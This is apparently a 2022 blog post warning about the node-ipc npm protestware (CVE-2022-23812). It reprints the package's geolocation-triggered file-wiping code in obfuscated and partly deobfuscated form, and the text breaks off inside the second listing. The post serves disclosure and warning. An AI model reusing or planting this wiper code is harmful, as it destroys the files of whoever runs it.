<!doctype html>
<html lang="en">
    <head>
        <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
        <meta content="text/html; charset=utf-8" http-equiv="content-type"/>
        <meta content="width=device-width, initial-scale=1" name="viewport"/>

        
        <meta name="robots" content="index,follow">
        <meta name="googlebot" content="index,follow">

        <meta name="google" content="nositelinkssearchbox">
        <meta name="google" content="notranslate">
        

        

    <meta content="npm package node-ipc is malware?" name="description"/>



        
        <link href="https://blog.thamognya.com/style.css" rel="stylesheet"/>
        
        <title>
    Npm package node-ipc is malware? - 
</title>
    </head>
    <body>
        <script>
            function evaluate_prefers_color() {
                if(localStorage.getItem('prefers-color') === 'dark') {
                    document.body.classList.add('dark');
                } else if(localStorage.getItem('prefers-color') === 'light') {
                    document.body.classList.remove('dark');
                } else if(window.matchMedia('(prefers-color-scheme: dark)').matches) {
                    document.body.classList.add('dark');
                }
            }
            evaluate_prefers_color();
        </script>
        
    <main class="article-content">
        <p><a href="..">..</a>/node-ipc-malware</p>
        
        <h1>Npm package node-ipc is malware?</h1>
        <p>Published: <time>2022-03-18</time></p>
        
        <hr />
        <h1 id="tldr">TLDR</h1>
<p>DO NOT use or update this module if you or your production servers etc. are located in a country actively involved in the invasion of Ukraine. Author of this package opposes said invasion and put a malicious code to wipe out data and put &quot;❤️&quot; on where they were. You are warned about this feature. Use at your own risk.</p>
<p>~~ Source: <a href="https://github.com/RIAEvangelist/node-ipc/pull/373/files">https://github.com/RIAEvangelist/node-ipc/pull/373/files</a></p>
<hr>
<h1 id="start">Start:</h1>
<p>Hey, this is a quick blog post about a topic that happened around yesterday. Brandon Nozaki Miller, or known as <a href="https://github.com/RIAEvangelist">RIAEvangelist</a> on github. He wanted to spread his views about the Russian-Ukraine war, and he wanted to harm people with Russian or countries related in the Ukraine-Russian war ip's by deleting all their data and replacing it with heart emojis like this: &quot;❤️&quot;. This is malware and a federal crime as he disguised it in a package (a popular one I might add).</p>
<p>This shows the darkside of opensource perfectly, one person gets some control and dependencies and uses it for bad. Basically one bad apple ruining a lot of other apples.</p>
<p>I have lost my trust in this dev, and wont be using his software again. I have reported him to gitub and npm.</p>
<p>If you would like to check if your packages are affected take a look at <a href="https://github.com/zlw9991/node-ipc-dependencies-list">https://github.com/zlw9991/node-ipc-dependencies-list</a>. A lot of electron packages are affected, and also vue/cli-shared-utils (a part of vue.js) is affected.</p>
<p>If you are wondering this is the line of code that is malicious. </p>
<hr>
<h3 id="warning-do-not-run-this-code-none-of-the-problems-and-issues-you-get-if-you-run-this-is-my-issue-or-problem-or-responsibility"><em><strong>Warning do not run this code, none of the problems and issues you get if you run this is my issue or problem or responsibility.</strong></em></h3>
<h1 id="cve-2022-23812"><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23812">CVE-2022-23812</a></h1>
<hr />
<h2 id="riaevangelist-node-ipc-is-malware-protestware"><em><strong><a href="https://github.com/RIAEvangelist/node-ipc">RIAEvangelist/node-ipc</a> is malware / protestware</strong></em></h2>
<p>The <code>RIAEvangelist/node-ipc</code> module contains protestware <a href="https://github.com/RIAEvangelist/peacenotwar">peacenotwar</a>.</p>
<p>Excerpt from RIAEvangelist/node-ipc:</p>
<blockquote>
<p><em><strong>as of v11.0.0 &amp; v9.2.2</strong></em> this module uses the <a href="https://github.com/RIAEvangelist/peacenotwar">peacenotwar</a> module.</p>
</blockquote>
<hr />
<p>More importantly, commits <code>847047cf7f81ab08352038b2204f0e7633449580 -&gt; 6e344066a0464814a27fbd7ca8422f473956a803</code> of <code>RIAEvangelist/node-ipc</code> contains malware.</p>
<hr />
<h3 id="warning-the-following-code-is-malicious-do-not-run-it">:warning:| The following code is malicious, DO NOT RUN IT</h3>
<p>https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js</p>
<blockquote>
<h5 id="the-following-codeblock-was-added-in-case-the-url-above-is-deactivated">The following codeblock was added in-case the url above is deactivated</h5>
<pre data-lang="js" style="background-color:#2e3440;color:#d8dee9;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#81a1c1;">import </span><span>u </span><span style="color:#81a1c1;">from</span><span style="color:#a3be8c;">&quot;path&quot;</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">import </span><span>a </span><span style="color:#81a1c1;">from</span><span style="color:#a3be8c;">&quot;fs&quot;</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">import </span><span>o </span><span style="color:#81a1c1;">from</span><span style="color:#a3be8c;">&quot;https&quot;</span><span style="color:#eceff4;">;</span><span style="color:#88c0d0;">setTimeout</span><span>(</span><span style="color:#81a1c1;">function</span><span>(){</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">t</span><span style="color:#81a1c1;">=</span><span style="color:#8fbcbb;">Math</span><span style="color:#81a1c1;">.</span><span style="font-style:italic;color:#88c0d0;">round</span><span>(</span><span style="color:#8fbcbb;">Math</span><span style="color:#81a1c1;">.</span><span style="font-style:italic;color:#88c0d0;">random</span><span>()</span><span style="color:#81a1c1;">*</span><span style="color:#b48ead;">4</span><span>)</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">if</span><span>(t</span><span style="color:#81a1c1;">&gt;</span><span style="color:#b48ead;">1</span><span>){</span><span style="color:#81a1c1;">return</span><span>}</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">n</span><span style="color:#81a1c1;">=</span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=&quot;</span><span style="color:#eceff4;">,</span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;</span><span>o</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">get</span><span>(n</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>)</span><span style="color:#eceff4;">,</span><span style="color:#81a1c1;">function</span><span>(t){t</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">on</span><span>(</span><span style="color:#a3be8c;">&quot;data&quot;</span><span style="color:#eceff4;">,</span><span style="color:#81a1c1;">function</span><span>(t){</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">n</span><span style="color:#81a1c1;">=</span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;Li8=&quot;</span><span style="color:#eceff4;">,</span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">o</span><span style="color:#81a1c1;">=</span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;Li4v&quot;</span><span style="color:#eceff4;">,</span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">r</span><span style="color:#81a1c1;">=</span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;Li4vLi4v&quot;</span><span style="color:#eceff4;">,</span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">f</span><span style="color:#81a1c1;">=</span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;Lw==&quot;</span><span style="color:#eceff4;">,</span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">c</span><span style="color:#81a1c1;">=</span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;Y291bnRyeV9uYW1l&quot;</span><span style="color:#eceff4;">,</span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">e</span><span style="color:#81a1c1;">=</span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;cnVzc2lh&quot;</span><span style="color:#eceff4;">,</span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">i</span><span style="color:#81a1c1;">=</span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;YmVsYXJ1cw==&quot;</span><span style="color:#eceff4;">,</span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">try</span><span>{</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">s</span><span style="color:#81a1c1;">=</span><span style="color:#8fbcbb;">JSON</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">parse</span><span>(t</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">u</span><span style="color:#81a1c1;">=</span><span>s[c</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>)]</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toLowerCase</span><span>()</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">a</span><span style="color:#81a1c1;">=</span><span>u</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">includes</span><span>(e</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#81a1c1;">||</span><span>u</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">includes</span><span>(i</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">if</span><span>(a){</span><span style="color:#88c0d0;">h</span><span>(n</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;</span><span style="color:#88c0d0;">h</span><span>(o</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;</span><span style="color:#88c0d0;">h</span><span>(r</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;</span><span style="color:#88c0d0;">h</span><span>(f</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))}}</span><span style="color:#81a1c1;">catch</span><span>(t){}})})}</span><span style="color:#eceff4;">,</span><span style="color:#8fbcbb;">Math</span><span style="color:#81a1c1;">.</span><span style="font-style:italic;color:#88c0d0;">ceil</span><span>(</span><span style="color:#8fbcbb;">Math</span><span style="color:#81a1c1;">.</span><span style="font-style:italic;color:#88c0d0;">random</span><span>()</span><span style="color:#81a1c1;">*</span><span style="color:#b48ead;">1e3</span><span>))</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">async function </span><span style="color:#88c0d0;">h</span><span>(n</span><span style="color:#81a1c1;">=</span><span style="color:#a3be8c;">&quot;&quot;</span><span style="color:#eceff4;">,</span><span>o</span><span style="color:#81a1c1;">=</span><span style="color:#a3be8c;">&quot;&quot;</span><span>){</span><span style="color:#81a1c1;">if</span><span>(</span><span style="color:#81a1c1;">!</span><span>a</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">existsSync</span><span>(n)){</span><span style="color:#81a1c1;">return</span><span>}</span><span style="color:#81a1c1;">let </span><span>r</span><span style="color:#81a1c1;">=</span><span>[]</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">try</span><span>{r</span><span style="color:#81a1c1;">=</span><span>a</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">readdirSync</span><span>(n)}</span><span style="color:#81a1c1;">catch</span><span>(t){}</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">f</span><span style="color:#81a1c1;">=</span><span>[]</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">c</span><span style="color:#81a1c1;">=</span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;4p2k77iP&quot;</span><span style="color:#eceff4;">,</span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">for</span><span>(</span><span style="color:#81a1c1;">var </span><span>e</span><span style="color:#81a1c1;">=</span><span style="color:#b48ead;">0</span><span style="color:#eceff4;">;</span><span>e</span><span style="color:#81a1c1;">&lt;</span><span>r</span><span style="color:#81a1c1;">.</span><span>length</span><span style="color:#eceff4;">;</span><span>e</span><span style="color:#81a1c1;">++</span><span>){</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">i</span><span style="color:#81a1c1;">=</span><span>u</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">join</span><span>(n</span><span style="color:#eceff4;">,</span><span>r[e])</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">let </span><span>t</span><span style="color:#81a1c1;">=null</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">try</span><span>{t</span><span style="color:#81a1c1;">=</span><span>a</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">lstatSync</span><span>(i)}</span><span style="color:#81a1c1;">catch</span><span>(t){</span><span style="color:#81a1c1;">continue</span><span>}</span><span style="color:#81a1c1;">if</span><span>(t</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">isDirectory</span><span>()){</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">s</span><span style="color:#81a1c1;">=</span><span style="color:#88c0d0;">h</span><span>(i</span><span style="color:#eceff4;">,</span><span>o)</span><span style="color:#eceff4;">;</span><span>s</span><span style="color:#81a1c1;">.</span><span>length</span><span style="color:#81a1c1;">&gt;</span><span style="color:#b48ead;">0</span><span style="color:#81a1c1;">?</span><span>f</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">push</span><span>(</span><span style="color:#81a1c1;">...</span><span>s)</span><span style="color:#81a1c1;">:null</span><span>}</span><span style="color:#81a1c1;">else if</span><span>(i</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">indexOf</span><span>(o)</span><span style="color:#81a1c1;">&gt;=</span><span style="color:#b48ead;">0</span><span>){</span><span style="color:#81a1c1;">try</span><span>{a</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">writeFile</span><span>(i</span><span style="color:#eceff4;">,</span><span>c</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>)</span><span style="color:#eceff4;">,</span><span style="color:#81a1c1;">function</span><span>(){})}</span><span style="color:#81a1c1;">catch</span><span>(t){}}}</span><span style="color:#81a1c1;">return </span><span>f}</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">ssl</span><span style="color:#81a1c1;">=true</span><span style="color:#eceff4;">;</span><span style="color:#81a1c1;">export </span><span>{ssl </span><span style="color:#81a1c1;">as default</span><span style="color:#eceff4;">,</span><span>ssl}
</span></code></pre>
</blockquote>
<h3 id="warning-the-above-code-is-malicious-do-not-run-it">:warning:| The above code is malicious, DO NOT RUN IT</h3>
<hr />
<p>I deobfuscated the code above and found that if the host machine's public ip address was from Russia or Belarus,
node-ipc would proceed overwrite many files with a heart emoji recursively while traversing up parent directories:</p>
<hr />
<h3 id="warning-the-following-code-is-malicious-do-not-run-it-1">:warning:| The following code is malicious, DO NOT RUN IT</h3>
<pre data-lang="js" style="background-color:#2e3440;color:#d8dee9;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#81a1c1;">import </span><span>u </span><span style="color:#81a1c1;">from </span><span style="color:#a3be8c;">&quot;path&quot;</span><span style="color:#eceff4;">;
</span><span style="color:#81a1c1;">import </span><span>a </span><span style="color:#81a1c1;">from </span><span style="color:#a3be8c;">&quot;fs&quot;</span><span style="color:#eceff4;">;
</span><span style="color:#81a1c1;">import </span><span>o </span><span style="color:#81a1c1;">from </span><span style="color:#a3be8c;">&quot;https&quot;</span><span style="color:#eceff4;">;
</span><span style="color:#88c0d0;">setTimeout</span><span>(</span><span style="color:#81a1c1;">function </span><span>() {
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">t </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">Math</span><span style="color:#81a1c1;">.</span><span style="font-style:italic;color:#88c0d0;">round</span><span>(</span><span style="color:#8fbcbb;">Math</span><span style="color:#81a1c1;">.</span><span style="font-style:italic;color:#88c0d0;">random</span><span>() </span><span style="color:#81a1c1;">* </span><span style="color:#b48ead;">4</span><span>)</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">if </span><span>(t </span><span style="color:#81a1c1;">&gt; </span><span style="color:#b48ead;">1</span><span>) {
</span><span>        </span><span style="color:#81a1c1;">return</span><span style="color:#eceff4;">;
</span><span>    }
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">n </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=&quot;</span><span style="color:#eceff4;">, </span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span>    o</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">get</span><span>(n</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>)</span><span style="color:#eceff4;">, </span><span style="color:#81a1c1;">function </span><span>(t) {
</span><span>        t</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">on</span><span>(</span><span style="color:#a3be8c;">&quot;data&quot;</span><span style="color:#eceff4;">, </span><span style="color:#81a1c1;">function </span><span>(t) {
</span><span>            </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">n </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;Li8=&quot;</span><span style="color:#eceff4;">, </span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span>            </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">o </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;Li4v&quot;</span><span style="color:#eceff4;">, </span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span>            </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">r </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;Li4vLi4v&quot;</span><span style="color:#eceff4;">, </span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span>            </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">f </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;Lw==&quot;</span><span style="color:#eceff4;">, </span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span>            </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">c </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;Y291bnRyeV9uYW1l&quot;</span><span style="color:#eceff4;">, </span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span>            </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">e </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;cnVzc2lh&quot;</span><span style="color:#eceff4;">, </span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span>            </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">i </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;YmVsYXJ1cw==&quot;</span><span style="color:#eceff4;">, </span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span>            </span><span style="color:#81a1c1;">try </span><span>{
</span><span>                </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">s </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">JSON</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">parse</span><span>(t</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;
</span><span>                </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">u </span><span style="color:#81a1c1;">= </span><span>s[c</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>)]</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toLowerCase</span><span>()</span><span style="color:#eceff4;">;
</span><span>                </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">a </span><span style="color:#81a1c1;">= </span><span>u</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">includes</span><span>(e</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>)) </span><span style="color:#81a1c1;">|| </span><span>u</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">includes</span><span>(i</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;
</span><span>                </span><span style="color:#81a1c1;">if </span><span>(a) {
</span><span>                    </span><span style="color:#88c0d0;">h</span><span>(n</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;
</span><span>                    </span><span style="color:#88c0d0;">h</span><span>(o</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;
</span><span>                    </span><span style="color:#88c0d0;">h</span><span>(r</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;
</span><span>                    </span><span style="color:#88c0d0;">h</span><span>(f</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;
</span><span>                }
</span><span>            } </span><span style="color:#81a1c1;">catch </span><span>(t) {}
</span><span>        })</span><span style="color:#eceff4;">;
</span><span>    })</span><span style="color:#eceff4;">;
</span><span>}</span><span style="color:#eceff4;">, </span><span style="color:#8fbcbb;">Math</span><span style="color:#81a1c1;">.</span><span style="font-style:italic;color:#88c0d0;">ceil</span><span>(</span><span style="color:#8fbcbb;">Math</span><span style="color:#81a1c1;">.</span><span style="font-style:italic;color:#88c0d0;">random</span><span>() </span><span style="color:#81a1c1;">* </span><span style="color:#b48ead;">1e3</span><span>))</span><span style="color:#eceff4;">;
</span><span style="color:#81a1c1;">async function </span><span style="color:#88c0d0;">h</span><span>(n </span><span style="color:#81a1c1;">= </span><span style="color:#a3be8c;">&quot;&quot;</span><span style="color:#eceff4;">, </span><span>o </span><span style="color:#81a1c1;">= </span><span style="color:#a3be8c;">&quot;&quot;</span><span>) {
</span><span>    </span><span style="color:#81a1c1;">if </span><span>(</span><span style="color:#81a1c1;">!</span><span>a</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">existsSync</span><span>(n)) {
</span><span>        </span><span style="color:#81a1c1;">return</span><span style="color:#eceff4;">;
</span><span>    }
</span><span>    </span><span style="color:#81a1c1;">let </span><span>r </span><span style="color:#81a1c1;">= </span><span>[]</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">try </span><span>{
</span><span>        r </span><span style="color:#81a1c1;">= </span><span>a</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">readdirSync</span><span>(n)</span><span style="color:#eceff4;">;
</span><span>    } </span><span style="color:#81a1c1;">catch </span><span>(t) {}
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">f </span><span style="color:#81a1c1;">= </span><span>[]</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">c </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;4p2k77iP&quot;</span><span style="color:#eceff4;">, </span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">for </span><span>(</span><span style="color:#81a1c1;">var </span><span>e </span><span style="color:#81a1c1;">= </span><span style="color:#b48ead;">0</span><span style="color:#eceff4;">; </span><span>e </span><span style="color:#81a1c1;">&lt; </span><span>r</span><span style="color:#81a1c1;">.</span><span>length</span><span style="color:#eceff4;">; </span><span>e</span><span style="color:#81a1c1;">++</span><span>) {
</span><span>        </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">i </span><span style="color:#81a1c1;">= </span><span>u</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">join</span><span>(n</span><span style="color:#eceff4;">, </span><span>r[e])</span><span style="color:#eceff4;">;
</span><span>        </span><span style="color:#81a1c1;">let </span><span>t </span><span style="color:#81a1c1;">= null</span><span style="color:#eceff4;">;
</span><span>        </span><span style="color:#81a1c1;">try </span><span>{
</span><span>            t </span><span style="color:#81a1c1;">= </span><span>a</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">lstatSync</span><span>(i)</span><span style="color:#eceff4;">;
</span><span>        } </span><span style="color:#81a1c1;">catch </span><span>(t) {
</span><span>            </span><span style="color:#81a1c1;">continue</span><span style="color:#eceff4;">;
</span><span>        }
</span><span>        </span><span style="color:#81a1c1;">if </span><span>(t</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">isDirectory</span><span>()) {
</span><span>            </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">s </span><span style="color:#81a1c1;">= </span><span style="color:#88c0d0;">h</span><span>(i</span><span style="color:#eceff4;">, </span><span>o)</span><span style="color:#eceff4;">;
